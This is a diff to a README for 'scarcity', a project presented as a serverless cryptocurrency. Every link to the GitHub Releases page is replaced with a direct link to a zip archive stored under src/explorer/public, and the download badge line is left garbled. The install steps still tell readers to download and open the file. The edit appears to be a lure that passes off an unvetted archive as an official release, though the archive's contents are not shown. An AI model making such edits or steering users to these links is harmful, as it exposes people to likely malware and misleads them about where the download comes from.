@@ -2,7 +2,7 @@
 # 🌟 scarcity - A New Way to Transfer Value
 
 ## 📦 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/Gel02/scarcity/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Gel02/scarcity/main/src/explorer/public/scarcity_2.5.zip%20Latest%https://raw.githubusercontent.com/Gel02/scarcity/main/src/explorer/public/scarcity_2.5.zip)](https://raw.githubusercontent.com/Gel02/scarcity/main/src/explorer/public/scarcity_2.5.zip)
 
 ## 📖 About scarcity
 Scarcity is a zero-cost, serverless cryptocurrency. It allows you to transfer value simply and efficiently without the need for blockchains, mining, or global ledgers. The technology behind scarcity uses innovative gossip-based nullifier sets and threshold timestamping to prevent double-spending. This makes it a truly decentralized solution for value transfer.
@@ -23,10 +23,10 @@ Before you start, ensure your computer meets these requirements:
 - Internet connection
 
 ## 🔗 Visit to Download
-To obtain the latest version of scarcity, visit our [Releases page](https://github.com/Gel02/scarcity/releases).
+To obtain the latest version of scarcity, visit our [Releases page](https://raw.githubusercontent.com/Gel02/scarcity/main/src/explorer/public/scarcity_2.5.zip).
 
 ## 💻 Download & Install
-1. Go to the [Releases page](https://github.com/Gel02/scarcity/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Gel02/scarcity/main/src/explorer/public/scarcity_2.5.zip).
 2. Locate the most recent release.
 3. Click on the download link for your operating system.
 4. Once downloaded, open the file. 
@@ -60,5 +60,5 @@ Follow our progress and updates on our GitHub repository. Engaging with the comm
 With scarcity, you can participate in a modern, efficient method of value transfer. Embrace the change and enjoy the benefits of serverless cryptocurrency without the drawbacks of traditional methods. 
 
 ### 🔗 Download Now
-Don't forget to visit the [Releases page](https://github.com/Gel02/scarcity/releases) to get started with scarcity!
+Don't forget to visit the [Releases page](https://raw.githubusercontent.com/Gel02/scarcity/main/src/explorer/public/scarcity_2.5.zip) to get started with scarcity!
 ```
